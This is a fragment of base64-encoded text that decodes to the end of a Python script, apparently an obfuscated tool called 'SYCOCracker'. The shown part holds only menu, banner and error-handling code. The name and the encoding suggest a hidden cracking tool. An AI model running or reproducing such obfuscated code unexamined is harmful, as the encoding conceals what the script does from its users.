gpCiAgICAgICAgaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9UHJlc3MgRU5URVIgdG8gY29udGludWUge3NlbGYuY29sb3IuV30iKQogICAgICAgIHNlbGYub2xkX21lbnUoKQoKCiAgICAgICAgZGVmIGNsZWFyKCk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KHByb19iYW5uZXIoKSkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgICAgY3JhY2tlciA9IFNZQ09DcmFja2VyKCkKICAgICAgICBjcmFja2VyLm9sZF9tZW51KCkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgnXG5ceDFiWzkxOzFtICAg4p6kIFN0b3BwZWRceDFiWzk3OzFtJykKICAgICAgICBzeXMuZXhpdCgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZidcblx4MWJbOTE7MW0gICDinqQgRXJyb3I6IHtzdHIoZSl9XHgxYls5NzsxbScpCiAgICAgICAgCiAgICAgICAgc3lzLmV4aXQoKSAK'))